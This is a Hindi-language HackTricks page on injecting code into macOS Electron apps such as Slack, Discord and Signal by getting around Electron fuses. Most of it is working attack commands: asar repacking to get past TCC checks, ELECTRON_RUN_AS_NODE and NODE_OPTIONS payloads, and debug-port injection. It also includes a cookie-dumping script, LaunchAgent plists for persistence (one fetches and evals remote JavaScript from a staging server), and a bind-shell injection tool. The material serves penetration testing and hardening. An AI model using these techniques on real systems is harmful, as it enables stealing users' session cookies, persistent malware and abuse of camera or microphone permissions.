# macOS इलेक्ट्रॉन एप्लिकेशन्स इंजेक्शन

{% hint style="success" %}
AWS हैकिंग सीखें और प्रैक्टिस करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम एक्सपर्ट (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और प्रैक्टिस करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम एक्सपर्ट (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 पर **फॉलो** करें [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में।

</details>
{% endhint %}

## मूल जानकारी

यदि आपको नहीं पता कि इलेक्ट्रॉन क्या है, तो आप [**यहाँ बहुत सारी जानकारी पा सकते हैं**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps)। लेकिन अब तक यह जान लें कि इलेक्ट्रॉन **नोड** चलाता है।\
और नोड के पास कुछ **पैरामीटर** और **एनवायरनमेंट वेरिएबल्स** हैं जो **इसे अन्य कोड को निष्पादित करने** के लिए उपयोग किया जा सकता है जो निर्दित फ़ाइल के अलावा।

### इलेक्ट्रॉन फ्यूज़

इन तकनीकों पर अगले में चर्चा की जाएगी, लेकिन हाल के समय में इलेक्ट्रॉन ने इन्हें रोकने के लिए कई **सुरक्षा झंडे जोड़े हैं**। ये हैं [**इलेक्ट्रॉन फ्यूज़**](https://www.electronjs.org/docs/latest/tutorial/fuses) और ये वे हैं जो इसका उपयोग करते हैं ताकि इलेक्ट्रॉन ऐप्स macOS में **कोड इंजेक्शन** को **लोड न करें**:

* **`RunAsNode`**: यदि यह अक्षम है, तो यह एनवायरनमेंट वेरिएबल **`ELECTRON_RUN_AS_NODE`** का उपयोग कोड इंजेक्शन करने को रोकता है।
* **`EnableNodeCliInspectArguments`**: यदि यह अक्षम है, तो `--inspect`, `--inspect-brk` जैसे पैरामीटर सम्मानित नहीं किए जाएंगे। इस तरह कोड इंजेक्शन को रोकते हैं।
* **`EnableEmbeddedAsarIntegrityValidation`**: यदि सक्षम है, तो लोड किया गया **`asar`** **फ़ाइल** macOS द्वारा **सत्यापित** किया जाएगा। इस तरह कोड इंजेक्शन को **इस तरह** रोकते हैं कि इस फ़ाइल की सामग्री को संशोधित करके।
* **`OnlyLoadAppFromAsar`**: यदि यह सक्षम है, तो निम्नलिखित क्रम में लोड करने की जगह खोजने की बजाय: **`app.asar`**, **`app`** और अंत में **`default_app.asar`**। यह केवल app.asar की जाँच करेगा और उसका उपयोग करेगा, इस तरह सुनिश्चित करते हुए कि **`embeddedAsarIntegrityValidation`** फ्यूज़ के साथ जब **मिलाया** जाता है तो **सत्यापित कोड** लोड करना **असंभव** है।
* **`LoadBrowserProcessSpecificV8Snapshot`**: यदि सक्षम है, ब्राउज़र प्रक्रिया `browser_v8_context_snapshot.bin` फ़ाइल का उपयोग अपने V8 स्नैपशॉट के लिए करेगा।

एक और दिलचस्प फ्यूज़ जो कोड इंजेक्शन को नहीं रोकेगा है:

* **EnableCookieEncryption**: यदि सक्षम है, तो डिस्क पर कुकी स्टोर OS स्तर के एनक्रिप्शन कुंजियों का उपयोग करके एन्क्रिप्ट किया जाता है।

### इलेक्ट्रॉन फ्यूज़ की जाँच

आप एक एप्लिकेशन से **इन झंडों की जाँच** कर सकते हैं:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### इलेक्ट्रॉन फ्यूज़ को संशोधित करना

जैसा कि [**दस्तावेज़ उल्लेख करते हैं**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), **इलेक्ट्रॉन फ्यूज़** का विन्यास **इलेक्ट्रॉन बाइनरी** के अंदर कॉन्फ़िगर किया जाता है जिसमें कहीं **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** स्ट्रिंग होती है।

macOS एप्लिकेशन में यह आम तौर पर `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework` में होता है।
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
आप इस फ़ाइल को [https://hexed.it/](https://hexed.it/) में लोड करके पिछले स्ट्रिंग की खोज कर सकते हैं। इस स्ट्रिंग के बाद आप ASCII में एक नंबर "0" या "1" देख सकते हैं जो प्रत्येक फ्यूज़ को अक्षम या सक्षम करता है। फ्यूज़ मानों को **बदलने** के लिए हेक्स कोड को संशोधित करें (`0x30` `0` है और `0x31` `1` है)।

<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यदि आप इस बाइट को संशोधित करके **`Electron Framework` बाइनरी** को एक एप्लिकेशन के अंदर अधिलेखित करने की कोशिश करते हैं, तो ऐप नहीं चलेगी।

## RCE इलेक्ट्रॉन एप्लिकेशन में कोड जोड़ना

एक इलेक्ट्रॉन ऐप में **बाहरी JS/HTML फ़ाइलें** हो सकती हैं, इसलिए एक हमलावर इन फ़ाइलों में कोड इंजेक्ट कर सकता है जिसका हस्ताक्षर जांच नहीं किया जाएगा और ऐप के संदर्भ में विभिन्न कोड को निषेधित कर सकता है।

{% hint style="danger" %}
हालांकि, इस समय 2 सीमाएँ हैं:

* **`kTCCServiceSystemPolicyAppBundles`** अनुमति की आवश्यकता है एक ऐप को संशोधित करने के लिए, इसलिए डिफ़ॉल्ट रूप से यह अब संभव नहीं है।
* संकलित **`asap`** फ़ाइल में आम तौर पर फ्यूज़ **`embeddedAsarIntegrityValidation`** और **`onlyLoadAppFromAsar`** सक्षम होते हैं

इस हमले का मार्ग और अधिक जटिल (या असंभव) बनाना।
{% endhint %}

ध्यान दें कि **`kTCCServiceSystemPolicyAppBundles`** की आवश्यकता को छोड़ना संभव है एक अन्य निर्देशिका में एप्लिकेशन की कॉपी करके (जैसे **`/tmp`**), फ़ोल्डर का नाम बदलकर **`app.app/Contents`** को **`app.app/NotCon`** बनाना, **asar** फ़ाइल को अपने **अशुद्ध** कोड के साथ संशोधित करना, इसे फिर से **`app.app/Contents`** में बदलना और इसे निष्पादित करना।

आप असर फ़ाइल से कोड को अनपैक कर सकते हैं:
```bash
npx asar extract app.asar app-decomp
```
और उसे बाद में पैक करें जब आप इसे संशोधित कर चुके हों:
```bash
npx asar pack app-decomp app-new.asar
```
## `ELECTRON_RUN_AS_NODE` के साथ RCE <a href="#electron_run_as_node" id="electron_run_as_node"></a>

[**दस्तावेज़**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node) के अनुसार, यदि यह env variable सेट किया जाता है, तो यह प्रक्रिया एक सामान्य Node.js प्रक्रिया के रूप में शुरू होगी।

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
यदि फ्यूज **`RunAsNode`** अक्षम है तो env var **`ELECTRON_RUN_AS_NODE`** को नजरअंदाज किया जाएगा, और यह काम नहीं करेगा।
{% endhint %}

### एप्लिकेशन प्लिस्ट से इंजेक्शन

जैसा कि [**यहाँ सुझाव दिया गया है**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), आप इस env वेरिएबल का दुरुपयोग कर सकते हैं एक प्लिस्ट में स्थिरता बनाए रखने के लिए:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## `NODE_OPTIONS` के साथ RCE

आप पेयलोड को एक अलग फ़ाइल में स्टोर कर सकते हैं और इसे एक्सीक्यूट कर सकते हैं:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
यदि फ्यूज **`EnableNodeOptionsEnvironmentVariable`** **अक्षम** है, तो ऐप **NODE\_OPTIONS** एनवायरन्मेंट वेरिएबल को **अनदेखा** करेगा जब तक यह एनवायरन्मेंट वेरिएबल **`ELECTRON_RUN_AS_NODE`** सेट नहीं होता है, जिसे भी **अनदेखा** किया जाएगा अगर फ्यूज **`RunAsNode`** अक्षम है।

अगर आप **`ELECTRON_RUN_AS_NODE`** सेट नहीं करते हैं, तो आपको **त्रुटि** मिलेगी: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
{% endhint %}

### एप्लिकेशन प्लिस्ट से इंजेक्शन

आप इस एनवायरन्मेंट वेरिएबल का दुरुपयोग कर सकते हैं एक प्लिस्ट में टिकाकर परिस्थिति बनाने के लिए इन कुंजियों को जोड़ते हैं:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## इंस्पेक्टिंग के साथ RCE

[**इस**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) के अनुसार, यदि आप **`--inspect`**, **`--inspect-brk`** और **`--remote-debugging-port`** जैसे फ्लैग्स के साथ एक इलेक्ट्रॉन एप्लिकेशन को निष्पादित करते हैं, तो एक **डीबग पोर्ट खुला रहेगा** ताकि आप इससे कनेक्ट कर सकें (उदाहरण के लिए Chrome से `chrome://inspect` में) और आप उस पर **कोड इंजेक्ट** कर सकें या नए प्रक्रियाएँ भी चला सकें।\
उदाहरण के लिए:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
यदि फ्यूज **`EnableNodeCliInspectArguments`** अक्षम है, तो ऐप **नोड पैरामीटर** को नजरअंदाज करेगा (जैसे `--inspect`) जब तक इन्हें लॉन्च किया नहीं जाता है जब तक एनवी वेरिएबल **`ELECTRON_RUN_AS_NODE`** सेट नहीं है, जिसे फ्यूज **`RunAsNode`** अक्षम होने पर भी **नजरअंदाज** किया जाएगा।

हालांकि, आप अब भी **इलेक्ट्रॉन पैरामीटर `--remote-debugging-port=9229`** का उपयोग कर सकते हैं लेकिन पिछला पेलोड अन्य प्रक्रियाओं को निष्पादित करने के लिए काम नहीं करेगा।
{% endhint %}

पैरामीटर **`--remote-debugging-port=9222`** का उपयोग करके इलेक्ट्रॉन ऐप से कुछ जानकारी चुरा सकते हैं जैसे **हिस्ट्री** (GET कमांड के साथ) या ब्राउज़र के **कुकीज़** (जैसे कि वे ब्राउज़र के अंदर **डिक्रिप्ट** होते हैं और एक **जेसन एंडपॉइंट** है जो उन्हें देगा)।

आप यह कैसे कर सकते हैं [**यहाँ**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) और [**यहाँ**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) और स्वचालित उपकरण [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) या एक सरल स्क्रिप्ट का उपयोग करें:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
[**इस ब्लॉगपोस्ट**](https://hackerone.com/reports/1274695) में, इस डीबगिंग का दुरुपयोग किया जाता है ताकि एक हेडलेस क्रोम **किसी भी स्थान पर विचारात्मक फ़ाइलें डाउनलोड कर सके**।

### एप्लिकेशन प्लिस्ट से इंजेक्शन

आप इस env वेरिएबल का दुरुपयोग प्लिस्ट में कर सकते हैं ताकि स्थिरता बनाए रखने के लिए इन कुंजियों को जोड़ें:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC बायपास पुराने संस्करणों का दुरुपयोग

{% hint style="success" %}
macOS से TCC डेमन एप्लिकेशन के निष्पादित संस्करण की जांच नहीं करता। इसलिए अगर आप **किसी भी पिछली तकनीक के साथ इलेक्ट्रॉन एप्लिकेशन में कोड इंजेक्ट नहीं कर सकते** तो आप पिछले संस्करण का ऐप डाउनलोड करके उसमें कोड इंजेक्ट कर सकते हैं क्योंकि यह अभी भी TCC अधिकार प्राप्त करेगा (यदि ट्रस्ट कैश इसे रोकता नहीं है)।
{% endhint %}

## गैर JS कोड चलाएं

पिछली तकनीक आपको **इलेक्ट्रॉन एप्लिकेशन के प्रक्रिया में JS कोड चलाने की अनुमति देगी**। हालांकि, ध्यान रखें कि **बच्ची प्रक्रियाएँ माता एप्लिकेशन के समान सैंडबॉक्स प्रोफ़ाइल के तहत चलती हैं** और **उनकी TCC अनुमतियों को वे संग्रहीत करते हैं**।\
इसलिए, यदि आप कैमरा या माइक्रोफोन तक पहुंचने के लिए अधिकारों का दुरुपयोग करना चाहते हैं, तो आप **प्रक्रिया से एक और बाइनरी चला सकते हैं**।

## स्वचालित इंजेक्शन

उपकरण [**electroniz3r**](https://github.com/r3ggi/electroniz3r) को आसानी से उपयोग किया जा सकता है ताकि यह **विकल्पीय इलेक्ट्रॉन एप्लिकेशन्स** को खोजें और उन पर कोड इंजेक्ट करें। यह उपकरण **`--inspect`** तकनीक का उपयोग करने की कोशिश करेगा:

आपको इसे खुद कंपाइल करना होगा और इसे इस प्रकार से उपयोग कर सकते हैं:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## संदर्भ

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{% hint style="success" %}
AWS हैकिंग सीखें और प्रैक्टिस करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम एक्सपर्ट (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और प्रैक्टिस करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम एक्सपर्ट (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) और **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** को** **फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स** [**HackTricks**](https://github.com/carlospolop/hacktricks) **और** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github रेपो में PR जमा करके।**

</details>
{% endhint %}
